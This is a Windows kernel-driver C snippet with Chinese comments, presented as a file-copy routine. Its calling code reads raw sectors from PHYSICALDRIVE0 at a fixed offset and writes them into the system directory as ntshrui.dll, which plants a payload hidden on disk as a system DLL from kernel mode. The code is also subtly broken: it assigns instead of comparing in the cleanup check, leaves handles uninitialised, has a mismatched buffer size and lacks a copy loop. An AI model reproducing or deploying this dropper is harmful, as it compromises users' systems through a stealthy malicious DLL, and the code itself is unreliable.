BOOLEAN
MyCopyFile(
           IN PUNICODE_STRING    ustrDestFile,
           IN PUNICODE_STRING    ustrSrcFile
            )
{
    HANDLE	hSrcFile, hDestFile;
    PVOID	buffer = NULL;
    ULONG	length = 0;
    LARGE_INTEGER	offset = {0};
    IO_STATUS_BLOCK	Io_Status_Block = {0};
    OBJECT_ATTRIBUTES	obj_attrib;
    NTSTATUS	status;
    BOOLEAN		bRet = FALSE;


        // 打开源文件
        InitializeObjectAttributes(&obj_attrib,
								   ustrSrcFile,
								   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
								   NULL,
								   NULL);
        status = ZwCreateFile(&hSrcFile,
							  GENERIC_READ,
							  &obj_attrib,
							  &Io_Status_Block,
							  NULL,
							  FILE_ATTRIBUTE_NORMAL,
							  FILE_SHARE_READ,
							  FILE_OPEN,
							  FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
							  NULL,
							  0);
        if (!NT_SUCCESS(status))
        {
			KdPrint(("Src ZwCreateFile Error\n"));
            bRet = FALSE;
            goto END;
        }
//The InitializeObjectAttributes macro initializes the opaque OBJECT_ATTRIBUTES structure, which specifies the properties of an object handle to routines that open handles.
        // 打开目标文件
        InitializeObjectAttributes(&obj_attrib, 
								   ustrDestFile,
								   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
								   NULL,
								   NULL);
        
        status = ZwCreateFile(&hDestFile,
							  GENERIC_WRITE,
							  &obj_attrib,
							  &Io_Status_Block,
							  NULL,
							  FILE_ATTRIBUTE_NORMAL,
							  FILE_SHARE_READ,
							  FILE_OPEN_IF,
							  FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
							  NULL,
							  0);
        if (!NT_SUCCESS(status))
        {
			KdPrint(("Dest ZwCreateFile Error\n"));
            bRet = FALSE;
            goto END;
        }

        // 为buffer分配4KB空间
        buffer = ExAllocatePool(NonPagedPool, 6144);
        if (buffer == NULL)
        {
            bRet = FALSE;
            goto END;
        }

        // 复制文件

            length = 5120;
	    offset.QuadPart = 6144;
            // 读取源文件
            status = ZwReadFile(hSrcFile,
                            NULL,
                            NULL,
                            NULL,
                            &Io_Status_Block,
                            buffer,
                            length,
                            &offset,
                            NULL);
            if (!NT_SUCCESS(status))
            {
                // 如果状态为STATUS_END_OF_FILE，说明文件已经读取到末尾
                if (status == STATUS_END_OF_FILE)
                {
                    bRet = TRUE;
                    goto END;
                }
            }

            // 获得实际读取的长度
            length = Io_Status_Block.Information;

            // 写入到目标文件
	    offset.QuadPart = 0;
            status = ZwWriteFile(hDestFile,
                                NULL,
                                NULL,
                                NULL,
                                &Io_Status_Block,
                                buffer,
                                length,
                                &offset,
                                NULL);
            if (!NT_SUCCESS(status))
            {
                bRet = FALSE;
                goto END;
            }
            
            // 移动文件指针
            //offset.QuadPart += length;
        

    

END:
    if (hSrcFile)
    {
        ZwClose(hSrcFile);
    }
    if (hDestFile)
    {
        ZwClose(hDestFile);
    }
    if (buffer = NULL)
    {
        ExFreePool(buffer);
    }

    return bRet;
}	

RtlInitUnicodeString(&ustrSrcFile, L"\\??\\PHYSICALDRIVE0");//读取目标文件,第一磁盘
RtlInitUnicodeString(&ustrDestFile, L"\\SystemRoot\\ntshrui.dll");//写入文件SystemRoot为系统所在目录比如系统在C盘就是C:\windows
    if(MyCopyFile(&ustrDestFile, &ustrSrcFile))//利用ZwCreateFile.ZwReadFile.ZwWriteFile进行文件读取创建创建
    {
		KdPrint(("[Test] CopyFile Success!"));
    }
    else
    {  
		KdPrint(("[Test] CopyFile Error!"));
    }